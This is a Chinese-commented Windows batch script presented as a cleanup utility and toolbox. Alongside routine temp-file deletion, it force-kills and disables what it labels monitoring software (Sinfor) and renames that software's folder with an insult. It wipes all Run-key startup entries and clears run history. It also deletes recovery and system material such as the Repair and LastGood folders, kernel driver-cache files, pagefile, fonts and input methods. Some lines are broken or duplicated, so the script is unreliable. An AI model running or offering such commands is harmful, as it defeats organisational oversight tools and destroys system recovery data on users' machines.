reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v item /d IMJPMIG
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v command /d "C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMEName"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v item /d TINTSETP
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v item /d TINTSETP
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
del "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\*.*" /q /f
del "C:\Documents and Settings\Default User\「开始」菜单\程序\启动\*.*" /q /f
del "%userprofile%\「开始」菜单\程序\启动\*.*" /q /f
cls
echo 清除运行记录 
echo Windows Registry Editor Version 5.00 >>pc.reg 
echo [-HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU] >>pc.reg 
regedit /s pc.reg 
del pc.reg 
goto kuaisuqingli123

:kuaisuqingli123
cls
gpupdate.exe /force
del /f /s /q %systemdrive%\*.tmp
del /f /s /q %systemdrive%\*._mp
del /f /s /q %systemdrive%\*.log
del /f /s /q %systemdrive%\*.gid
del /f /s /q %systemdrive%\*.chk
del /f /s /q %systemdrive%\*.old
del /f /s /q %systemdrive%\recycled\*.*
del /f /s /q %userprofile%\Documents\Tencent Files\*.tdl
del /f /s /q %windir%\*.bak
del /f /s /q %windir%\prefetch\*.*
rd /s /q %windir%\temp & md %windir%\temp
del /f /q %userprofile%\cookies\*.*
del /f /q %userprofile%\recent\*.*
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /f /s /q "%userprofile%\Local Settings\Temp\*.*"
del /f /s /q %userprofile%\recent\*.*
echo 正在清理安装包垃圾...
for %%l in (%pf%) do if exist %%l:\ (
	del /f /s /q %%l:\i4Tools7\*.*
	rd /f /s /q %%l:\i4Tools7
	del /f /s /q %%l:\AMD\*.*
	rd /f /s /q %%l:\AMD
	del /f /s /q %%l:\NVIDIA\*.*
	rd /f /s /q %%l:\NVIDIA
	del /f /s /q %%l:\Anyo\*.*
	rd /f /s /q %%l:\Anyo
	del /f /s /q %%l:\DTLDownLoads\*.*
	rd /f /s /q %%l:\DTLDownLoads
	del /f /s /q %%l:\DTLFolder\*.*
	rd /f /s /q %%l:\DTLFolder
	del /f /s /q %%l:\FFOutput\*.tmp
	del /f /s /q %%l:\KDubaSoftDownloads\*.*
	del /f /s /q %%l:\SOFTMGR\*.*
	del /f /s /q %%l:\QMDownload\*.exe
	del /f /s /q %%l:\QMDownload\*.msi
	del /f /s /q %%l:\ksDownloads\*.*
	del /f /s /q %%l:\qycache\*.*
	del /f /s /q %%l:\tmp\*.*
	del /f /s /q %%l:\XSBDownload\*.*
	del /f /s /q %%l:\Windows.old\*.*
	rd /f /s /q %%l:\Windows.old
	del /f /s /q %%l:\WindowsApps\*.*
	rd /f /s /q %%l:\WindowsApps
	rd /f /s /q %%l:\WUDownloadCache\*.*
	del /f /s /q %%l:\360SoftMgrGame\*.*
	del /f /s /q %%l:\KwDownload\*.*
	del /f /s /q %%l:\360安全浏览器下载\*.exe
	del /f /s /q %%l:\360安全浏览器下载\*.msi
	del /f /s /q %%l:\360安全浏览器下载\*.com
	del /f /s /q %%l:\360Downloads\*.*
	del /f /s /q %%l:\WeSingCache\*.*
	del /f /s /q %%l:\KuGou\Temp\*.mkv
	del /f /s /q %%l:\StormMediap\*.*
	del /f /s /q %%l:\KuGou\Temp\*.krc
	del /f /s /q  C:\$Recycle.Bin\*.* 
	rd /s /q   $Recycle.Bin
	rd /s /q   %%l:\$RECYCLE.BIN
)
cls
taskkill /f /im mshta.exe
taskkill /f /im desktmc.exe
regsvr32 /u /s desktmbho.dll
regsvr32 /u /s safebrowser.dll
regsvr32 /u /s mgrwml.dll
regsvr32 /u /s ieoptimize.dll
regsvr32 /u /s bhoex.dll
regsvr32 /u /s ieextend.dll
taskkill /f /im foundation.exe
@echo 正在结束监控软件的进程!
taskkill /f /im arpguard.exe
taskkill /f /im ingress.exe
taskkill /f /im srport.exe
taskkill /f /im zreboot.exe
taskkill /f /im zrupdate.exe
echo.
echo 正在重命名监控软件的目录!
ren "C:\Program Files\Sinfor" "FuckyouSinfor"
echo.
echo 正在禁用监控软件开机启动!
net stop zrupdate
sc config zrupdate start= DISABLED
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveAutoRun /t REG_BINARY /d ffffff03 /f>nul 2>nul
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t REG_DWORD /d 0x00000001 /f>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2" /f>nul 2>nul
taskkill /F /IM ctfmon.exe /IM ctfmon.exe /IM SVOHOST.exe /IM AdobeR.exe /IM ravmone.exe /IM wincfgs.exe /IM doc.exe /IM rose.exe /IM sxs.exe /IM autorun.exe /IM KB20060111.exe>nul 2>nul
echo Y|cacls "%USERPROFILE%\「开始」菜单\程序\启动" /C /P everyone:F>nul 2>nul
echo Y|cacls "%ALLUSERSPROFILE%\「开始」菜单\程序\启动" /C /P everyone:F>nul 2>nul
attrib -s -h -r "%USERPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
attrib -s -h -r "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
del /A /F /S /Q "%USERPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
del /A /F /S /Q "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
rem echo Y|cacls "%USERPROFILE%\「开始」菜单\程序\启动" /C /P everyone:N>nul 2>nul
rem echo Y|cacls "%ALLUSERSPROFILE%\「开始」菜单\程序\启动" /C /P everyone:N>nul 2>nul
del c:\winnt\logo1_.exe
del c:\windows\logo1_.exe
del C:\winnt\system32\Logo1_.exe
del C:\winnt\system32\rundl132.exe
del C:\winnt\system32\bootconf.exe
del C:\winnt\system32\kill.exe
del C:\winnt\system32\sws32.dll
del C:\windows\Logo1_.exe
del C:\windows\rundl132.exe
del C:\windows\bootconf.exe
del C:\windows\kill.exe
del C:\windows\sws32.dll
del C:\windows\dll.dll
del C:\windows\vdll.dll
del c:\windows\tdll.dll
del C:\windows\system32\ShellExt\svchs0t.exe
del c:\windows\system32\Logo1_.exe
del C:\windows\system32\rundl132.exe
del C:\windows\system32\bootconf.exe
del C:\windows\system32\kill.exe
del C:\windows\system32\sws32.dll
CLS
del c:\_desktop.ini /f/s/q/a
del d:\_desktop.ini /f/s/q/a
del e:\_desktop.ini /f/s/q/a
del f:\_desktop.ini /f/s/q/a
del g:\_desktop.ini /f/s/q/a
del h:\_desktop.ini /f/s/q/a
del i:\_desktop.ini /f/s/q/a
del j:\_desktop.ini /f/s/q/a
del k:\_desktop.ini /f/s/q/a
cls
echo 简易清除NrsMiner挖矿病毒
del /f /s /q C:\Windows\NerworkDistribution\*.*
Rd /s/q C:\Windows\NerworkDistribution
del /f /s /q C:\Windows\system32\dllhostex.exe
cls
title 再次清理.....
echo 正在清理所有磁盘根目录autorun.inf文件...
FOR %%M IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (DEL/A/F/Q %%M:\AUTORUN.INF
DEL/A/F/Q %%M:\SXS.EXE
DEL/A/F/Q %%M:\OSO.EXE
DEL/A/F/Q %%M:\SETUP.EXE)
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /va /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /va /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ctfmon.exe /d C:\WINDOWS\system32\ctfmon.exe
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v item /d IMJPMIG
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v command /d "C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMEName"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v item /d TINTSETP
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v item /d TINTSETP
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
del "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\*.*" /q /f
del "C:\Documents and Settings\Default User\「开始」菜单\程序\启动\*.*" /q /f
del "%userprofile%\「开始」菜单\程序\启动\*.*" /q /f
cls
echo 正在清理共享文档...
Rd /s/q "%AllUser%\Documents\My Videos
Rd /s/q "%AllUser%\Documents\My Pictures
Rd /s/q "%AllUser%\Documents\My Music
cls
echo 正在清理WMP10目录...
Rd /s/q "%ProgFile%\Windows Media Player\Icons
Rd /s/q "%ProgFile%\Windows Media Player\Sample Playlists
Rd /s/q "%ProgFile%\Windows Media Player\Skins
Rd /s/q "%ProgFile%\Windows Media Player\Visualizations
Del /a/f/s/q "%ProgFile%\Windows Media Player\*.txt
cls
echo 正在清理开始菜单...
Del /a/f/s/q "%AllUser%\「开始」菜单\Windows Catalog.*
Del /a/f/s/q "%AllUser%\「开始」菜单\Windows Update.*
Del /a/f/s/q "%AllUser%\「开始」菜单\设定程序访问和默认值.*
cls
echo 正在清理360安全卫士目录...
Rd /s/q "%ProgFile%\360Safe\hotfix"
cls
echo 正在清理清理ACDSee目录...
Rd /s/q "%CurUser%\Application Data\ACD Systems
Del /a/f/s/q "%ProgFile%\ACDSee\*.hlp"
Del /a/f/s/q "%ProgFile%\ACDSee\*.cnt"
Del /a/f/s/q "%ProgFile%\ACDSee\PlugIns\*.hlp
Del /a/f/s/q "%ProgFile%\ACDSee\PlugIns\*.chm
cls
echo 正在清理暴风影音目录...
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\*.txt
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\*.ini
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\*.dat
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\GSpot.exe
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\StormSet.exe
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\Codecs\languages\ffdshow.1033.en
Rd /s/q "%AllUser%\Application Data\Storm\Update
Rd /s/q "%AllUser%\「开始」菜单\程序\暴风影音
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\CoreVideo.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTime3GPP.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTime.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeAudioSupport.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeEssentials.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeH264.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeInternetExtras.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeMPEG4.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeStreaming.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeStreamingExtras.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeVR.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeWebHelper.Resources\en.lproj
cls
echo 正在清理 极点五笔 目录...
Rd /s/q "%CurUser%\「开始」菜单\程序\freeime
Del /a/f/s/q "%ProgFile%\freeime\freeime.htm
Del /a/f/s/q "%ProgFile%\freeime\极点五笔 纪念版.url
Del /a/f/s/q "%ProgFile%\freeime\*.gif
Del /a/f/s/q "%ProgFile%\freeime\*.txt
Rd /s/q "%ProgFile%\freeime\skin\Apple_Z
Rd /s/q "%ProgFile%\freeime\skin\bear2
Rd /s/q "%ProgFile%\freeime\skin\Elegant
Rd /s/q "%ProgFile%\freeime\skin\IF_Taiji
Rd /s/q "%ProgFile%\freeime\skin\time
Rd /s/q "%ProgFile%\freeime\skin\du
Rd /s/q "%ProgFile%\freeime\skin\huan
Rd /s/q "%ProgFile%\freeime\skin\Tango NightXP
Rd /s/q "%ProgFile%\freeime\skin\youxihou
Rd /s/q "%ProgFile%\freeime\skin\blueness
Rd /s/q "%ProgFile%\freeime\skin\Hello Kitty
Rd /s/q "%ProgFile%\freeime\skin\MG_S
Rd /s/q "%ProgFile%\freeime\skin\VistaHeiMini
cls
echo 正在清理 酷我音乐盒 目录...
Del /a/f/s/q "%CurUser%\Application Data\Microsoft\Internet Explorer\Quick Launch\酷我音乐盒.*
Rd /s/q "%CurUser%\「开始」菜单\程序\酷我音乐盒
Del /a/f/s/q "%ProgFile%\KWMUSIC\readme.txt
cls
echo 正在清理 MSOFFICE 目录...
Del /a/f/s/q "%ProgFile%\Microsoft Office\OFFICE11\2052\*.chm
Del /a/f/s/q "%ProgFile%\Microsoft Office\OFFICE11\2052\*.htm
cls
echo 正在清理 PPStream 目录...
Del /a/f/q "%AllUser%\「开始」菜单\程序\PPS 网络电视.*
Rd /s/q "%AllUser%\「开始」菜单\程序\PPStream
Del /a/f/s/q "%ProgFile%\PPStream\*.url
Del /a/f/s/q "%ProgFile%\PPStream\whatsnew.txt
cls
echo 正在清理 RealPlayer 目录...
Del /a/f/q "%ProgFile%\Real\RealPlayer\Setup\setup.exe"
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.chm
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.txt
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.html
cls
echo 正在清理 RealPlayer KoWo 目录...
Rd /s/q "%ProgFile%\KWREAL"
cls
echo 关闭客户体验改善计划
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /d 0 /t REG_DWORD /f
cls
echo 开启“快速启动”
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v "HiberbootEnabled" /d 1 /t REG_DWORD /f
cls
echo IE11开启企业模式
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Main\EnterpriseMode" /v SiteList /d "HKCU\Software\policies\Microsoft\Internet Explorer\Main\EnterpriseMode" /t reg_sz /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Main\EnterpriseMode" /v Enable /d "" /t reg_sz /f
cls
echo 禁止一联网就打开浏览器
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\NetworkConnectivityStatusIndicator" /v "NoActiveProbe" /d 1 /t REG_DWORD /f
cls
echo 正在清理 WINRAR 目录...
Del /a/f/q "%ProgFile%\WinRAR\*.diz
Del /a/f/q "%ProgFile%\WinRAR\*.txt
Del /a/f/q "%ProgFile%\WinRAR\*.chm
Del /a/f/q "%ProgFile%\WinRAR\*.htm
cls
echo 正在清理 千千静听 目录...
Del /a/f/q "%ProgFile%\千千静听\readme.txt
Del /a/f/s/q "%CurUser%\Application Data\Microsoft\Internet Explorer\Quick Launch\千千静听.*
echo 正在清理紫光拼音输入法用户词库...
Del /a/f/q "%AllUser%\Application Data\UNISPIM\usrwl.dat"
Del /a/f/q "%CurUser%\Application Data\UNISPIM\usrwl.dat"
cls
echo 正在清理超级兔子注册表备份...
Rd /s/q "%WinDir%\MAGICSET"
cls
echo 正在清理磁盘检测时生成的损坏文件备份...
Rd /s/q "%HomeDrive%\Found.*"
For /f "delims=\" %%i in ('dir "%HomeDrive%\Found.*" /adh /b') do Rd /s/q "%HomeDrive%\%%i"
cls
echo 正在清理虚拟内存文件...
Del /a/f/q "%HomeDrive%\PageFile.sys"
cls
echo 正在清理系统休眠文件...
Del /a/f/q "%HomeDrive%\HiberFil.sys"
cls
echo 正在清理系统临时文件...
Del /a/f/s/q "%WinDir%\Temp\*.*"
cls
echo 正在清理程序预读文件...
Del /a/f/s/q "%WinDir%\Prefetch\*.*"
cls
echo 正在清理驱动预编译文件...
Del /a/f/s/q "%WinDir%\Inf\*.PNF"
cls
echo.清理硬件驱动备份
Del /a/f/s/q "%SysDir%\ReinstallBackups\*.*"
cls
eecho 正在清理 繁体 输入法...
Rd /s/q "%WinDir%\ime\CHTIME"
cls
echo 正在清理 日文 输入法...
Rd /s/q "%WinDir%\ime\IMJP8_1"
Rd /s/q "%WinDir%\ime\imejp"
Rd /s/q "%WinDir%\ime\imejp98"
cls
echo 正在清理 韩文 输入法...
Rd /s/q "%WinDir%\ime\IMKR6_1"
cls
echo 正在清理 繁体 输入法的 手写识别 文件...
Del /a/f/q "%WinDir%\ime\CHTIME\Applets\HWXCHT.DLL"
cls
echo 正在清理 仓颉码 输入法...
Rd /s/q "%SysDir%\IME\CINTLGNT"
cls
echo 正在清理 注音 输入法...
Rd /s/q "%SysDir%\IME\TINTLGNT"
cls
echo 正在清理希腊、土耳其、中欧等字体...
Del /a/f/q "%WinDir%\Fonts\gulim.ttc"
Del /a/f/q "%WinDir%\Fonts\msgothic.ttc"
cls
echo 正在清理网页临时文件...
Del /a/f/s/q "%CurUser%\Local Settings\Temporary Internet Files\*.*"
cls
echo 正在清理用户临时文件...
Del /a/f/s/q "%CurUser%\Local Settings\Temp\*.*"
cls
echo 正在清理网页历史纪录...
Del /a/f/s/q "%CurUser%\Local Settings\History\*.*"
cls
echo 正在清理访问过的网络邻居快捷方式...
Del /a/f/s/q "%CurUser%\NetHood\*.*"
cls
echo 正在清理未完成的打印任务...
Del /a/f/s/q "%CurUser%\PrintHood\*.*"
cls
echo 正在清理最近使用的文档纪录...
Del /a/f/s/q "%CurUser%\Recent\*.*"
cls
echo 正在清理网页 Cookie...
Del /a/f/s/q "%CurUser%\Cookies\*.*"
cls
echo 正在清理图标缓存文件...
Del /a/f/q "%CurUser%\Local Settings\Application Data\IconCache.db"
cls
echo 正在清理超级兔子注册表备份...
Rd /s/q "%WinDir%\MAGICSET"
cls
echo 正在清理磁盘检测时生成的损坏文件备份...
Rd /s/q "%HomeDrive%\Found.*"
For /f "delims=\" %%i in ('dir "%HomeDrive%\Found.*" /adh /b') do Rd /s/q "%HomeDrive%\%%i"
cls
echo 正在清理虚拟内存文件...
Del /a/f/q "%HomeDrive%\PageFile.sys"
cls
echo 正在清理系统休眠文件...
Del /a/f/q "%HomeDrive%\HiberFil.sys"
cls
echo 正在清理系统补丁卸载文件...
echo.Rd /s/q "%WinDir%\$*$"
For /f "delims=\" %%i in ('dir "%Windir%\$*$" /adh /b') do Rd /s/q "%WinDir%\%%i"
cls
echo 正在清理系统临时文件...
Del /a/f/s/q "%WinDir%\Temp\*.*"
cls
echo 正在清理程序预读文件...
Del /a/f/s/q "%WinDir%\Prefetch\*.*"
cls
echo 正在清理驱动预编译文件...
Del /a/f/s/q "%WinDir%\Inf\*.PNF"
cls
echo.清理硬件驱动备份
Del /a/f/s/q "%SysDir%\ReinstallBackups\*.*"
cls
echo 正在清理无用的 Windows 程序...
Del /a/f/s/q "%ProgFile%\Outlook Express\*.txt
Del /a/f/s/q "%ProgFile%\Online Services\*.*
Rd /s/q "%ProgFile%\Messenger"
Rd /s/q "%ProgFile%\Movie Maker"
Rd /s/q "%ProgFile%\MSN Gaming Zone"
Rd /s/q "%ProgFile%\NetMeeting"
cls
echo 正在清理注册表最后一次访问位置...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /t "REG_SZ" /d "我的电脑" /f
cls
echo 正在清理注册表中的程序运行记录...
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
cls
echo 正在清理最后一次正确配置文件...
Rd /s/q "%WinDir%\LastGood"
cls
echo 正在清理注册表等文件备份...
Rd /s/q "%WinDir%\Repair"
cls
echo 正在清理系统补丁生成的系统驱动备份...
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrnlmp.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrnlpa.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrpamp.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntoskrnl.exe"
cls
echo 正在清理 DESKTOP.INI
FOR %%M IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (DEL/A/F/Q %%M:\desktop.ini
)
taskkill /f /im ChsIME.exe
set CHK_SVC=YES
set XPSP2=FALSE
set SERVER=FALSE
set NT_SERVER_CHK=TRUE
chkdsk
cls
goto end

:tools520
cls
mode con cols=45 lines=36
title 工具箱
echo -------------------------------------------
echo                 极力工具箱                   
echo -------------------------------------------
echo 网络修复请输入1     ┃    IE修复请输入2
echo 设置防火墙请输入3   ┃微型任务关闭器请输入4
echo Word修复请输入5     ┃   弹出光驱请输入6
echo 格式化U盘请输入7    ┃  修复网页错误请输入8
echo 查看物理内存请输入9 ┃   病毒查杀请输入Q 
echo 修改睡眠模式请输入R
echo 修复内存不能为READ请输入W
echo 辅助完全卸载VMware请输入V
echo (Win7用)修改开机登录壁纸输入B
echo -------------------------------------------
echo 返回请输入0
echo -------------------------------------------
set choice= 
set /p choice=请输入回应：
if "%choice%"=="" goto tools520
if /i '%choice%'=='0' goto back1234
if /i '%choice%'=='1' goto xiufuip
if /i '%choice%'=='2' goto xiufuie
if /i '%choice%'=='3' goto fanghuoqiang
if /i '%choice%'=='4' goto jincheng
if /i '%choice%'=='5' goto wordxiufu
if /i '%choice%'=='6' goto tanchuguangqu
if /i '%choice%'=='7' goto winishaguiwd
if /i '%choice%'=='8' goto xiufuwangyecuowu
if /i '%choice%'=='9' goto wulineicun
if /i '%choice%'=='W' goto neicunread
if /i '%choice%'=='R' goto shuimianmoshi
if /i '%choice%'=='Q' goto chasha
if /i '%choice%'=='V' goto delVM
if /i '%choice%'=='B' goto bizhixiugai
:wufashibei
cls
echo 无法识别您的指令！
pause
goto tools520
:back1234
cls
goto maxice

:bizhixiugai
cls
echo -------------------------------------------
echo 当前分辨率信息：
wmic DESKTOPMONITOR where Status='ok' get ScreenHeight,ScreenWidth
echo 请将需要修改的开机登录界面的壁纸（必须是JPG格式，占内存越小越好）更名为：backgroundDefault
echo 把图片然后移动到C盘根目录，剩下的由我们来做！
pause
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background /v OEMBackground /t REG_DWORD /d "1" /f
cls
move C:\backgroundDefault.jpg C:\Windows\System32\oobe\info\backgrounds >nul
pause
GOTO tools520

:wulineicun
cls
systeminfo|find "物理内存总量"
pause>nul
goto tools520
:shuimianmoshi
cls
echo -------------------------------------------
echo   在睡眠模式下...
echo     联网、断电请输入1
echo     断网、断电请输入2
echo   返回工具箱请按回车。
echo.
set route1=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
SET Choice=
SET /P Choice= 请选择要模式(1,2),再按回车: 
IF /I '%Choice:~0,1%'=='1' GOTO shuimian1
IF /I '%Choice:~0,1%'=='2' GOTO shuimian2
GOTO tools520

:shuimian1
